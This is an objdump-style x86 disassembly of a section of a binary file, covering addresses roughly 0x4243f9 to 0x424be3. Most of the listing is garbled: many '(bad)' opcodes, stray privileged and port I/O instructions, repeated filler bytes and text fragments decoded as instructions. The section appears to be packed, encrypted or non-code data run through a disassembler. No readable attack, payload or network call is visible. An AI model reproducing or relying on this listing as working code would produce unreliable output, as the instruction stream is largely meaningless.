  4243f9:	add    BYTE PTR [eax],al
  4243fb:	add    bh,bh
  4243fd:	(bad)  
  4243fe:	jge    0x424440
  424400:	xchg   DWORD PTR [esi-0x45],eax
  424403:	test   eax,0x1e877608
  424409:	pusha  
  42440a:	rcl    DWORD PTR [ecx-0x5161d422],0x64
  424411:	es xor eax,0xff375b6c
  424417:	(bad)  
  424418:	fidiv  DWORD PTR [edi-0x8cb0001]
  42441e:	(bad)  
  42441f:	call   DWORD PTR [edi-0x712a05fe]
  424425:	add    ecx,DWORD PTR [esi+0x27]
  424428:	mov    bl,0xfe
  42442a:	rcl    BYTE PTR [ecx-0x24],1
  42442d:	or     al,0xa2
  42442f:	inc    ecx
  424430:	imul   ebp,DWORD PTR [ecx],0x88dbd74c
  424436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424437:	jecxz  0x424438
  424439:	add    cl,al
  42443b:	scas   al,BYTE PTR es:[edi]
  42443c:	scas   al,BYTE PTR es:[edi]
  42443d:	cmp    BYTE PTR [eax],al
  42443f:	add    BYTE PTR [eax],al
  424441:	xor    al,0xab
  424443:	xchg   DWORD PTR [ecx+edx*1+0x53],edi
  424447:	pop    ebp
  424448:	std    
  424449:	push   0x9a65a110
  42444e:	cld    
  42444f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424450:	pop    edx
  424451:	mov    dl,0xc8
  424453:	jbe    0x424460
  424455:	sub    eax,0xe2fec807
  42445a:	jns    0x42446c
  42445c:	inc    eax
  42445d:	mov    esp,0x143d6ce0
  424462:	or     eax,DWORD PTR [eax+eax*1]
  424465:	add    BYTE PTR [ebp+0x1],ch
  42446b:	lea    ecx,[ebp-0x72727273]
  424471:	lea    ecx,[ebp-0x7b991e73]
	...
  42447f:	add    BYTE PTR [eax],al
  424481:	add    BYTE PTR [ebx],cl
  424483:	jg     0x42449d
  424485:	loopne 0x42447e
  424487:	sbb    eax,0xcd037074
  42448c:	cmp    eax,0xf8b19c94
  424491:	inc    ebx
  424492:	add    BYTE PTR [ebp+0x9e16e85],dl
  424498:	pop    ebx
  424499:	and    eax,0xd8990000
  42449e:	enter  0x61ec,0xe1
  4244a2:	fs lock jbe 0x4244b4
  4244a6:	mov    bh,0x6c
  4244a8:	(bad)  
  4244a9:	pop    eax
  4244aa:	pop    ebx
  4244ab:	sbb    DWORD PTR [edx],0xd8599c0b
  4244b1:	mov    al,BYTE PTR [ecx-0x3cf0bf64]
  4244b7:	sbb    eax,esp
  4244b9:	add    BYTE PTR [eax],al
  4244bb:	xor    eax,0x1cf5
  4244c0:	xchg   edx,eax
  4244c1:	sub    ebp,esi
  4244c3:	add    BYTE PTR [eax],al
  4244c5:	mov    esi,0xb73613a4
  4244ca:	shr    dh,1
  4244cc:	pusha  
  4244cd:	aam    0xb5
  4244cf:	neg    DWORD PTR [ebx+0x1]
  4244d2:	(bad)  
  4244d3:	cmp    al,0xd9
  4244d5:	jns    0x42453c
  4244d7:	les    eax,FWORD PTR [ebx]
  4244d9:	and    al,0xe3
  4244db:	dec    esi
  4244dc:	push   eax
  4244dd:	add    BYTE PTR [eax],al
  4244df:	add    BYTE PTR [ecx],ch
  4244e1:	inc    DWORD PTR [eax]
  4244e3:	add    ch,al
  4244e5:	rol    BYTE PTR [eax],cl
  4244e7:	add    BYTE PTR [eax],al
  4244e9:	(bad)  
  4244ea:	(bad)  
  4244eb:	(bad)  
  4244ec:	(bad)  
  4244ed:	(bad)  
  4244ee:	(bad)  
  4244ef:	(bad)  
  4244f0:	(bad)  
  4244f1:	inc    DWORD PTR [ecx-0x66f01654]
  4244f7:	sub    ecx,esp
  4244f9:	pop    ss
  4244fa:	popf   
  4244fb:	repnz aaa 
  4244fd:	inc    ebp
  4244fe:	loop   0x424554
  424500:	lahf   
  424501:	ins    BYTE PTR es:[edi],dx
  424502:	mov    dh,0x34
  424504:	mov    ecx,DWORD PTR [ebp+0x41]
  424507:	test   BYTE PTR [eax+0x5],0x0
  42450e:	add    BYTE PTR [eax],al
  424510:	add    BYTE PTR [eax],al
  424512:	add    BYTE PTR [eax],al
  424514:	add    ch,dl
  424516:	or     al,0x86
  424518:	inc    ecx
  424519:	add    BYTE PTR [eax],al
  42451b:	add    al,0x83
  42451d:	inc    edx
  42451e:	mov    dl,0xb3
  424520:	pop    ss
  424521:	push   ebp
  424522:	(bad)  
  424523:	adc    cl,BYTE PTR [esi+edx*8]
  424526:	mov    ecx,esi
  424528:	(bad)  
  424529:	pop    ecx
  42452a:	jecxz  0x424515
  42452c:	ret    
  42452d:	jbe    0x424591
  42452f:	call   0x2bd2df44
  424534:	into   
  424535:	sub    al,0x27
  424537:	mov    dl,0x7b
  424539:	in     eax,0xb0
  42453b:	(bad)  
  42453c:	das    
  42453d:	fiadd  WORD PTR [eax]
  42453f:	add    BYTE PTR [esi-0x7d],cl
  424542:	add    BYTE PTR [eax],al
  424544:	dec    ecx
  424545:	inc    ebx
  424546:	jecxz  0x424548
  424548:	je     0x4244ec
  42454a:	pop    ds
  42454b:	lgs    esi,FWORD PTR [ebx]
  42454e:	inc    esi
  42454f:	xchg   DWORD PTR [esi+0x21],ebx
  424552:	adc    cl,BYTE PTR [ecx+0x5c]
  424555:	dec    edx
  424556:	mov    edi,0x7873643a
  42455b:	jb     0x4245c2
  42455d:	inc    ebx
  42455e:	ds ds cmp eax,0x41563c6d
  424565:	jo     0x4245ab
  424567:	imul   esp,DWORD PTR [eax],0x3d636569
  42456d:	and    BYTE PTR [edx+0x70],dh
  424570:	jae    0x4245e4
  424572:	outs   dx,DWORD PTR ds:[esi]
  424573:	and    BYTE PTR [ebx+0x20],dh
  424576:	cmp    eax,0x6d0d6d3e
  42457b:	arpl   WORD PTR cs:[ebx+0x57],dx
  42457f:	and    BYTE PTR [eax+0x28],dl
  424582:	gs ins DWORD PTR es:[di],dx
  424585:	inc    ecx
  424586:	gs ins WORD PTR es:[edi],dx
  424589:	bound  esi,QWORD PTR [edi+ebp*1+0x44]
  42458d:	push   eax
  42458e:	or     ch,BYTE PTR [ecx+0x2e]
  424591:	ins    DWORD PTR es:[edi],dx
  424592:	je     0x4245b6
  424594:	bound  esp,QWORD PTR [eax]
  424596:	and    BYTE PTR [ecx+0x6c],ch
  424599:	jae    0x42460d
  42459b:	ds popa 
  42459d:	outs   dx,BYTE PTR ds:[esi]
  42459e:	data16 and BYTE PTR [eax+0x20],dh
  4245a2:	je     0x424612
  4245a4:	inc    ebx
  4245a5:	cmp    al,0xd
  4245a7:	sub    DWORD PTR [eax+0x76],esi
  4245aa:	and    BYTE PTR gs:[esi+0x65],ch
  4245ae:	inc    esp
  4245af:	inc    ebx
  4245b0:	jbe    0x424628
  4245b2:	popa   
  4245b3:	bound  esi,QWORD PTR [ecx+0x4d]
  4245b6:	sub    DWORD PTR [ebx+0x43],edx
  4245b9:	outs   dx,DWORD PTR ds:[esi]
  4245ba:	outs   dx,BYTE PTR ds:[esi]
  4245bb:	outs   dx,BYTE PTR ds:[esi]
  4245bc:	ds gs jb 0x424613
  4245c0:	gs jbe 0x424628
  4245c3:	or     ch,BYTE PTR [esi]
  4245c5:	jb     0x4245f5
  4245c7:	inc    ecx
  4245c8:	jb     0x424639
  4245ca:	gs jae 0x4245d0
  4245cd:	ffree  st(7)
  4245cf:	js     0x4245ed
  4245d1:	jnp    0x424596
  4245d3:	arpl   WORD PTR [ebx],dx
  4245d5:	push   edx
  4245d6:	je     0x42464c
  4245d8:	je     0x42456f
  4245da:	pop    eax
  4245db:	dec    ecx
  4245dc:	leave  
  4245dd:	mov    al,0x1c
  4245df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245e0:	jg     0x4245d4
  4245e2:	adc    bh,bh
  4245e4:	addr16 lahf 
  4245e6:	iret   
  4245e7:	int    0x23
  4245e9:	mov    dh,0x75
  4245eb:	test   al,0x5d
  4245ed:	pop    esp
  4245ee:	jne    0x42461f
  4245f0:	xor    BYTE PTR [eax+0x23ff8d93],dl
  4245f6:	je     0x42466c
  4245f8:	scas   eax,DWORD PTR es:[edi]
  4245f9:	(bad)  [edi+0x747474]
	...
  424607:	rcr    DWORD PTR [eax+0x0],cl
	...
  424615:	inc    edi
  424616:	hlt    
  424617:	xor    BYTE PTR [esi+eiz*2-0x62],bl
  42461b:	and    ch,BYTE PTR [ebp-0x7]
  42461e:	mov    ah,0x4e
  424620:	fwait
  424621:	adc    esp,DWORD PTR [eax+0x46c56efb]
  424627:	test   cl,dl
  424629:	xor    DWORD PTR [edx],esi
  42462b:	add    edi,eax
  42462d:	add    BYTE PTR [eax],al
  42462f:	add    BYTE PTR [eax+eax*1],0x0
  424633:	jl     0x42464d
  424635:	add    BYTE PTR [eax],al
  424637:	test   al,0x37
  424639:	adc    esi,eax
  42463b:	lods   al,BYTE PTR ds:[esi]
  42463c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42463d:	fdivr  st(7),st
  42463f:	ins    DWORD PTR es:[edi],dx
  424640:	jmp    0xa8ccc04a
  424645:	lock fbstp TBYTE PTR [edi+0x708784cb]
  42464c:	dec    esi
  42464d:	add    DWORD PTR [ecx+0x78a47500],ebp
  424653:	mov    cl,0x91
  424655:	jne    0x4246cc
  424657:	jne    0x424667
  424659:	arpl   WORD PTR [esi-0x13],dx
  42465c:	inc    ecx
  42465d:	mov    ah,BYTE PTR [eax+0x4]
  424660:	ret    0x3f20
  424663:	lods   eax,DWORD PTR ds:[esi]
  424664:	pop    es
  424665:	fwait
  424666:	in     al,dx
  424667:	aaa    
  424668:	call   0x486e7c6a
  42466d:	sbb    esp,DWORD PTR [ebx+0xe]
  424670:	dec    edi
  424671:	repnz push 0x76
  424674:	cmp    eax,0xa1b55af9
  424679:	or     bh,BYTE PTR [eax+0x75]
  42467c:	jne    0x424634
  42467e:	mov    ds:0x757575,al
	...
  42468b:	pand   mm3,QWORD PTR [ebp+0x45]
  42468f:	inc    ebp
  424690:	inc    ebp
  424691:	inc    ebp
  424692:	inc    ebp
  424693:	inc    ebp
  424694:	inc    ebp
  424695:	inc    ebp
  424696:	inc    ebp
  424697:	mov    ecx,DWORD PTR [ebx-0x471ff2ef]
  42469d:	jle    0x424700
  42469f:	lock cli 
  4246a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a2:	enter  0xad99,0xc0
  4246a6:	sub    DWORD PTR [eax+0x5b2360d],ebx
  4246ac:	mov    BYTE PTR [ecx-0x18],dl
  4246af:	fiadd  WORD PTR [ecx+0x5d008b8b]
  4246b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246b6:	(bad)  
  4246b8:	seto   dl
  4246bb:	mov    BYTE PTR [eax+0x2a],0xb0
  4246bf:	pop    ss
  4246c0:	xor    BYTE PTR [edx+edx*1-0x60],ch
  4246c4:	xor    dh,BYTE PTR [ecx+esi*4+0x62]
  4246c8:	into   
  4246c9:	clc    
  4246ca:	inc    esi
  4246cb:	mov    ah,0xe8
  4246cd:	das    
  4246ce:	xchg   edi,eax
  4246cf:	out    dx,al
  4246d0:	mov    ecx,DWORD PTR [ebx-0x7439d29a]
  4246d6:	mov    esp,ecx
  4246d8:	lods   al,BYTE PTR ds:[esi]
  4246d9:	mov    ebp,0x5931008b
  4246de:	mov    eax,ds:0xe5c2a8be
  4246e3:	imul   DWORD PTR [ebx-0x7b]
  4246e6:	into   
  4246e7:	div    BYTE PTR [eax]
  4246e9:	dec    edx
  4246ea:	push   0xb473d78f
  4246ef:	sub    al,0x3a
  4246f1:	push   es
  4246f2:	inc    eax
  4246f3:	sbb    al,BYTE PTR [eax]
  4246f5:	add    BYTE PTR [eax],al
  4246f7:	pop    esp
  4246f8:	and    eax,0x4400000
	...
  424709:	jp     0x4246a6
  42470b:	in     eax,0x48
  42470d:	jbe    0x4246e0
  42470f:	outs   dx,BYTE PTR ds:[esi]
  424710:	mov    ebp,0x16d93cc2
  424715:	add    ah,BYTE PTR [edx-0x55]
  424718:	loope  0x4246fc
  42471a:	push   ds
  42471b:	xchg   DWORD PTR [ebp-0x2c],ebp
  42471e:	and    DWORD PTR [ecx],ebx
  424720:	cmp    DWORD PTR [eax],eax
	...
  42472a:	add    al,0x4
  42472c:	pop    ds
  42472d:	dec    ebp
  42472e:	sub    eax,0x7d040421
  424733:	data16 cmp al,0xf0
  424736:	xor    DWORD PTR [ebx+0x13cc63c4],eax
  42473c:	fdivr  DWORD PTR [ebp+edx*1-0x1c]
  424740:	test   DWORD PTR [ebp+0x5c],0x5b4e370
  424747:	push   edx
  424748:	mov    ebx,0xa4a3630b
  42474d:	scas   eax,DWORD PTR es:[edi]
  42474e:	jno    0x4247b9
  424750:	stos   DWORD PTR es:[edi],eax
  424751:	cli    
  424752:	pop    eax
  424753:	addr16 mov dh,0x4
  424756:	add    al,0x70
  424758:	dec    esi
  424759:	add    al,0x4
  42475b:	mov    eax,0x8d043058
  424760:	enter  0x5cf4,0xbd
  424764:	std    
  424765:	retf   
  424766:	int3   
  424767:	clc    
  424768:	xchg   esi,eax
  424769:	xchg   edi,eax
  42476a:	leave  
  42476b:	ret    
  42476c:	not    DWORD PTR [ebp-0x1513b94d]
  424772:	adc    al,0x90
  424774:	pop    es
  424775:	fs retf 
  424777:	outs   dx,DWORD PTR ds:[esi]
  424778:	lea    ecx,[ebp+0x450d9d8d]
  42477e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42477f:	std    
  424780:	jnp    0x42474d
  424782:	lea    edi,ds:0xc7a8da9c
  424788:	test   eax,0xb288d218
  42478d:	or     DWORD PTR [ecx-0x7dc0fe93],0x2d
  424794:	imul   edx,DWORD PTR [ecx+eax*2-0x3e],0xffffff8d
  424799:	(bad)  
  42479a:	shl    BYTE PTR [ecx+0x2],cl
  42479d:	lea    ecx,[ebp+0x8d]
  4247a3:	add    BYTE PTR [eax],al
  4247a5:	add    BYTE PTR [eax],al
  4247a7:	add    BYTE PTR [eax],al
  4247a9:	popa   
  4247aa:	div    DWORD PTR [esi-0x75]
  4247ad:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4247b3:	mov    ecx,DWORD PTR [ebx-0x193d3334]
  4247b9:	jb     0x42479b
  4247bb:	rol    DWORD PTR [esi+0x6e],cl
  4247be:	adc    edx,DWORD PTR [esp+eiz*4+0x7adcdb8e]
  4247c5:	mov    edi,0x64d5a6b4
  4247ca:	xor    BYTE PTR [edx+0x7e],dl
  4247cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247ce:	sbb    esp,ecx
  4247d0:	int3   
  4247d1:	mov    ch,0x42
  4247d3:	int3   
  4247d4:	int3   
  4247d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247d6:	xchg   edx,eax
  4247d7:	int3   
  4247d8:	int3   
  4247d9:	adc    DWORD PTR [ebp-0x29],ebp
  4247dc:	pushf  
  4247dd:	stos   DWORD PTR es:[edi],eax
  4247de:	push   cs
  4247df:	aad    0x4e
  4247e1:	xchg   esi,eax
  4247e2:	ja     0x424801
  4247e4:	jns    0x424840
  4247e6:	mov    esp,0xe9b23915
  4247eb:	retf   
  4247ec:	xchg   DWORD PTR [ebx+edx*8+0x45cc2775],esp
  4247f3:	push   edi
  4247f4:	lods   eax,DWORD PTR ds:[esi]
  4247f5:	nop
  4247f6:	pusha  
  4247f7:	inc    ebp
  4247f8:	inc    ebp
  4247f9:	inc    ebp
  4247fa:	inc    esp
  4247fb:	xor    eax,0x4e1d50b1
  424800:	sub    ah,BYTE PTR [edx]
  424802:	add    edi,0xffffffc5
  424805:	or     eax,0x5cddba57
  42480a:	inc    eax
  42480b:	shr    DWORD PTR [ebx-0x36],1
  42480e:	pop    es
  42480f:	mov    WORD PTR [edi],ss
  424811:	or     eax,0x4750895a
  424816:	adc    DWORD PTR [esi+0x55408083],esp
  42481c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42481d:	inc    ebp
  42481e:	inc    ebp
  42481f:	pop    es
  424820:	rol    DWORD PTR [ebp+0x45],cl
  424823:	inc    ebp
	...
  42482c:	add    BYTE PTR [edx],cl
  42482e:	(bad)  
  42482f:	pop    ds
  424830:	lea    ecx,[ebp-0x72727273]
  424836:	lea    ecx,[ebp-0x718b8b73]
  42483c:	dec    ebp
  42483d:	(bad)  
  42483e:	(bad)  [edi-0x5579c3f0]
  424844:	sahf   
  424845:	test   ecx,edi
  424847:	add    BYTE PTR [ebp+0x35014b61],0x1e
  42484e:	les    edx,FWORD PTR ds:0x74c383bb
  424854:	je     0x4248c8
  424856:	imul   ebx,DWORD PTR [esi-0x63],0xffffffda
  42485a:	rol    DWORD PTR [ebp+0x46],1
  42485d:	and    ecx,DWORD PTR [edi]
  42485f:	adc    BYTE PTR [edi-0x4d],0xf4
  424863:	sbb    eax,0x9414434f
  424868:	xchg   DWORD PTR [ebx],eax
  42486a:	std    
  42486b:	xor    al,0x54
  42486d:	les    ebp,FWORD PTR [ecx-0x37]
  424870:	cs in  eax,0x74
  424873:	je     0x4248d4
  424875:	leave  
  424876:	imul   esi,DWORD PTR [esp+esi*2-0x78],0x74f9ef
  42487e:	loop   0x4248bd
  424880:	mov    edx,0xc83e052d
  424885:	inc    ebp
  424886:	push   ds
  424887:	push   edi
  424888:	sbb    BYTE PTR [eax+ebp*8+0x1b6ef971],ah
  42488f:	mov    DWORD PTR [edx-0x211773ca],edi
  424895:	cmp    DWORD PTR [eax],eax
  424897:	add    BYTE PTR [eax],al
  424899:	fisttp DWORD PTR [eax+0x47bb0000]
	...
  4248ab:	(bad)  
  4248ac:	call   0xe529f52e
  4248b1:	xchg   edx,eax
  4248b2:	icebp  
  4248b3:	leave  
  4248b4:	mov    ebp,esp
  4248b6:	mov    ds:0x6e6f900c,al
  4248bb:	repnz xchg edx,eax
  4248bd:	sbb    eax,0x95ca85eb
  4248c2:	int3   
  4248c3:	(bad)  
  4248c4:	(bad)  
  4248c5:	(bad)  
  4248c6:	(bad)  
  4248c7:	(bad)  
  4248c8:	(bad)  
  4248c9:	(bad)  
  4248ca:	(bad)  
  4248cb:	push   DWORD PTR [ebp+0x75]
  4248ce:	(bad)  
  4248d0:	and    DWORD PTR [ebx],edx
  4248d2:	jne    0x424949
  4248d4:	not    ah
  4248d6:	popa   
  4248d7:	xor    eax,0xdd900456
  4248dc:	or     dl,BYTE PTR [esi-0x3a2d2022]
  4248e2:	xor    al,0x7f
  4248e4:	jae    0x4248c7
  4248e6:	inc    esi
  4248e7:	jl     0x42494c
  4248e9:	daa    
  4248ea:	outs   dx,DWORD PTR ds:[esi]
  4248eb:	data16 inc BYTE PTR [edi+0x7b]
  4248ef:	dec    esp
  4248f0:	mov    edx,0x49c1fa4a
  4248f5:	add    bl,0x75
  4248f8:	jne    0x4248c8
  4248fa:	xchg   ebx,eax
  4248fb:	jne    0x424972
  4248fd:	int    0x39
  4248ff:	out    dx,al
  424900:	jne    0x424902
  424902:	pusha  
  424903:	jge    0x42496f
  424905:	loopne 0x424979
  424907:	cdq    
  424908:	aad    0xca
  42490a:	es je  0x424932
  42490d:	cmc    
  42490e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42490f:	mov    ds:0xc80b0da9,eax
  424914:	jbe    0x424976
  424916:	(bad)  
  424917:	mov    BYTE PTR [esi],0x77
  42491a:	add    BYTE PTR [eax],al
  42491c:	add    BYTE PTR [ebx-0x5e7a89ae],dh
  424922:	mov    dl,0x5f
  424924:	fwait
  424925:	jle    0x4248c2
  424927:	push   ss
  424928:	(bad)  
  424929:	shl    ah,0x90
  42492c:	xor    dl,bl
  42492e:	push   0x6961cbea
  424933:	jbe    0x424979
  424935:	outs   dx,DWORD PTR ds:[esi]
  424936:	push   edi
  424937:	sub    BYTE PTR [esi],ch
  424939:	imul   ebp,DWORD PTR [esi+0x2e],0x53202e2e
  424940:	and    BYTE PTR [ebp+0x20],ah
  424943:	outs   dx,DWORD PTR gs:[esi]
  424945:	je     0x424967
  424947:	ins    DWORD PTR es:[edi],dx
  424948:	imul   esp,DWORD PTR [ebx],0x65766354
  42494e:	ja     0x4249be
  424950:	push   ebx
  424951:	and    BYTE PTR [ebp+0x6d],ah
  424954:	or     eax,0x2c20546d
  424959:	gs ins DWORD PTR es:[edi],dx
  42495b:	and    BYTE PTR ds:0x72662020,cl
  424961:	gs jb  0x4249d7
  424964:	ins    DWORD PTR es:[edi],dx
  424965:	jb     0x4249db
  424967:	or     eax,0x656d7420
  42496c:	imul   ebp,DWORD PTR [esi],0x5365653d
  424972:	push   edx
  424973:	push   0x79732e4d
  424978:	bound  ebp,QWORD PTR [esi]
  42497a:	jo     0x42499c
  42497c:	bound  ebp,QWORD PTR [esi]
  42497e:	imul   edx,DWORD PTR [edi+0x65],0x743e6520
  424985:	and    BYTE PTR [esi],bh
  424987:	cs push 0x76227665
  42498d:	gs jns 0x4249f5
  424990:	imul   esp,DWORD PTR [edx+eiz*2+0x76],0x656f3a0a
  424998:	ins    DWORD PTR es:[edi],dx
  424999:	pop    es
  42499a:	(bad)
  42499d:	ds cld 
  42499f:	inc    ecx
  4249a0:	iret   
  4249a1:	pop    ds
  4249a2:	add    BYTE PTR [eax],al
  4249a4:	or     BYTE PTR ds:0xd1,al
  4249aa:	mov    DWORD PTR [ecx-0x76767677],ecx
  4249b0:	mov    DWORD PTR [ecx+0x59402389],ecx
	...
  4249be:	add    BYTE PTR [eax],al
  4249c0:	add    BYTE PTR [ebp-0x46],dl
  4249c3:	(bad)  
  4249c5:	push   edx
  4249c6:	xchg   edx,eax
  4249c7:	jno    0x4249e9
  4249c9:	push   ebp
  4249ca:	and    bh,BYTE PTR [esi]
  4249cc:	cmc    
  4249cd:	rol    DWORD PTR [esi-0x4b0e1b1],0xcd
  4249d4:	sub    BYTE PTR [ecx-0x5],0xcd
  4249d8:	fiadd  DWORD PTR [eax]
  4249da:	add    BYTE PTR [edx],al
  4249dc:	fild   WORD PTR [eax]
  4249de:	add    BYTE PTR ds:0xcf000090,dl
  4249e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249e5:	inc    ebp
  4249e6:	mov    ebx,DWORD PTR [esi]
  4249e8:	fmul   DWORD PTR [esi+0x5baf12b1]
  4249ee:	stos   BYTE PTR es:[edi],al
  4249ef:	pop    ss
  4249f0:	loope  0x424a20
  4249f2:	push   ecx
  4249f3:	jg     0x424a3b
  4249f5:	add    al,0xff
  4249f7:	into   
  4249f8:	out    dx,al
  4249f9:	test   BYTE PTR [edx],bl
  4249fb:	add    bh,bh
  4249fd:	retf   
  4249fe:	in     eax,0xaa
  424a00:	xchg   edi,eax
  424a01:	(bad)  
  424a02:	(bad)  
  424a03:	(bad)  
  424a04:	cli    
  424a05:	mov    esi,edi
  424a07:	call   0x6ad5:0x6b2653eb
  424a0e:	mov    al,0x8c
  424a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a11:	mov    ds:0x5d895bc7,eax
  424a16:	je     0x424a15
  424a18:	or     esp,DWORD PTR [edx]
  424a1a:	add    eax,0x7902ff65
  424a1f:	adc    eax,0xac72ac97
  424a24:	popa   
  424a25:	lock cmp edi,edi
  424a28:	call   FWORD PTR ds:0xffffff18
  424a2e:	(bad)  
  424a2f:	(bad)  
  424a30:	(bad)  
  424a31:	(bad)  
  424a32:	(bad)  
  424a33:	(bad)  
  424a34:	(bad)  
  424a35:	(bad)  
  424a36:	inc    DWORD PTR [esi-0x727209ad]
  424a3c:	lea    ecx,[ebp-0x72727273]
  424a42:	(bad)  
  424a43:	rol    al,0x92
  424a46:	push   eax
  424a47:	rcl    DWORD PTR ds:0x263e18e4,0xb1
  424a4e:	ret    
  424a4f:	jo     0x424a6f
  424a51:	mov    esi,0x170e9907
  424a56:	xor    ah,BYTE PTR [edi+0x52]
  424a59:	mov    edx,DWORD PTR [ebx-0x3f3f8364]
  424a5f:	out    0x8b,eax
  424a61:	xchg   ebp,eax
  424a62:	rol    DWORD PTR [edi-0x61],cl
  424a65:	sbb    cl,bh
  424a67:	add    bl,BYTE PTR [eiz*1+0x4b8411ce]
  424a6e:	dec    ecx
  424a6f:	and    al,dl
  424a71:	sub    DWORD PTR [ebx+0x7a11afdb],eax
  424a77:	xor    al,0xa
  424a79:	repz dec edi
  424a7b:	or     al,al
  424a7d:	shl    bl,0x3e
  424a80:	ss rol al,0xb4
  424a84:	imul   esp,DWORD PTR [edi],0xffffffc0
  424a87:	or     BYTE PTR [edi-0x6b],bh
  424a8a:	sub    eax,0xd49afd69
  424a8f:	stc    
  424a90:	mov    eax,ds:0x3c6caeb3
  424a95:	(bad)  
  424a96:	rcr    dh,0x60
  424a99:	pop    esi
  424a9a:	es repnz fsubp st(4),st
  424a9e:	push   ebx
  424a9f:	mov    ecx,0x9e080808
  424aa4:	ror    DWORD PTR [eax],1
  424aa6:	or     ch,ch
  424aa8:	add    cl,BYTE PTR [eax]
  424aaa:	or     BYTE PTR [eax],cl
  424aac:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  424ab3:	add    DWORD PTR [ebx+0xd92bf92],0xffffff80
  424aba:	cmp    ebx,DWORD PTR [edx]
  424abc:	sbb    al,0x76
  424abe:	bound  ebp,QWORD PTR [esi+0x19]
  424ac1:	retf   0xccee
  424ac4:	inc    eax
  424ac5:	int3   
  424ac6:	ror    DWORD PTR [ebx],0x88
  424ac9:	les    edi,FWORD PTR [edi+0x56]
  424acc:	ror    BYTE PTR [ebp-0x72727273],1
  424ad2:	lea    ecx,[ebp+0x8d8d]
  424ad8:	add    dl,BYTE PTR [esi+eiz*8+0x4f]
  424adc:	add    BYTE PTR [eax],al
  424ade:	xchg   esi,eax
  424adf:	pusha  
  424ae0:	shl    DWORD PTR [ebx-0x7f04a306],1
  424ae6:	cld    
  424ae7:	push   edi
  424ae8:	sbb    dh,BYTE PTR [eax-0x3858c085]
  424aee:	(bad)  
  424aef:	push   ds
  424af0:	or     al,0x6a
  424af2:	dec    edx
  424af3:	push   edi
  424af4:	mov    edi,0xa2fbda2b
  424af9:	pop    esp
  424afa:	in     al,dx
  424afb:	mov    WORD PTR gs:[ebx-0x77],?
  424aff:	inc    esi
  424b00:	popa   
  424b01:	add    BYTE PTR [eax],al
  424b03:	aas    
  424b04:	pusha  
  424b05:	add    BYTE PTR [eax],al
  424b07:	fst    QWORD PTR [edx-0x43ffff9d]
  424b0d:	fistp  WORD PTR [eax+0x2]
  424b10:	fistp  WORD PTR gs:[edx-0x19]
  424b14:	mov    ebx,0x80ccdee7
  424b19:	and    eax,DWORD PTR [ebx+0x11]
  424b1c:	out    dx,al
  424b1d:	jnp    0x424b40
  424b1f:	inc    esp
  424b20:	inc    ebp
  424b21:	shl    DWORD PTR [edx+0xf7],0xa5
  424b28:	gs mov edi,0x9ca5dc6a
  424b2e:	(bad)  
  424b2f:	jnp    0x424ba6
  424b31:	mov    dx,0xf0c6
  424b35:	add    dh,dl
  424b37:	mov    al,ds:0xdbd3af06
  424b3c:	sbb    BYTE PTR [edi-0x791e65ed],dl
  424b42:	cmp    bh,BYTE PTR [edx]
  424b44:	add    BYTE PTR [eax],al
  424b46:	push   esp
  424b47:	loopne 0x424b55
  424b49:	add    BYTE PTR [eax],al
  424b4b:	add    BYTE PTR [eax],cl
  424b4d:	or     BYTE PTR [eax],cl
  424b4f:	or     BYTE PTR [eax],cl
  424b51:	or     BYTE PTR [eax],cl
  424b53:	or     BYTE PTR [eax],cl
  424b55:	xor    al,0xf0
  424b57:	jno    0x424b68
  424b59:	(bad)  
  424b5a:	(bad)  
  424b5b:	(bad)  
  424b5c:	(bad)  
  424b5d:	(bad)  
  424b5e:	(bad)  
  424b5f:	(bad)  
  424b60:	sldt   WORD PTR [eax]
  424b63:	iret   
  424b64:	jno    0x424b59
  424b66:	inc    esi
  424b67:	xchg   edx,eax
  424b68:	xchg   esp,eax
  424b69:	jl     0x424b6a
  424b6b:	mov    bl,0xc6
  424b6d:	call   0xfe40c87f
  424b72:	(bad)
  424b76:	stos   BYTE PTR es:[edi],al
  424b77:	ret    0x5d92
  424b7a:	xor    DWORD PTR [eax],eax
  424b7c:	add    BYTE PTR [eax+eiz*8+0x0],ch
  424b80:	add    BYTE PTR [edi],bl
  424b82:	cmp    eax,DWORD PTR [eax]
  424b84:	add    BYTE PTR [esi-0x4],al
  424b87:	popf   
  424b88:	adc    bh,BYTE PTR [edi]
  424b8a:	add    al,0xb8
  424b8c:	out    0x54,eax
  424b8e:	and    BYTE PTR [ebp+eax*1-0x22],0x82
  424b93:	not    ah
  424b95:	xchg   esi,eax
  424b96:	test   DWORD PTR [edi+0x59da849a],eax
  424b9c:	pop    esp
  424b9d:	add    al,al
  424b9f:	dec    ebx
  424ba0:	stos   BYTE PTR es:[edi],al
  424ba1:	sub    ebp,ebx
  424ba3:	rol    al,0xc0
  424ba6:	inc    esi
  424ba7:	xchg   ebx,eax
  424ba8:	push   ecx
  424ba9:	stc    
  424baa:	mov    ecx,0x85315d4d
  424baf:	in     eax,dx
  424bb0:	je     0x424baf
  424bb2:	and    eax,0x8be88d2e
  424bb7:	rol    BYTE PTR [ecx+0x4b473593],cl
  424bbd:	dec    ebp
  424bbe:	imul   edi,DWORD PTR [edx+0x61],0x3131722c
  424bc5:	inc    esp
  424bc6:	jbe    0x424ba4
  424bc8:	stc    
  424bc9:	rol    al,0xf9
  424bcc:	xadd   al,al
  424bcf:	rol    al,0xc0
  424bd2:	rol    al,0xc0
  424bd5:	rol    al,0xc0
  424bd8:	rcr    bl,0x2e
  424bdb:	imul   edi,edi,0xffffffff
  424bde:	(bad)  
  424bdf:	(bad)  
  424be0:	(bad)  
  424be1:	(bad)  
  424be2:	(bad)  
  424be3:	(bad)  
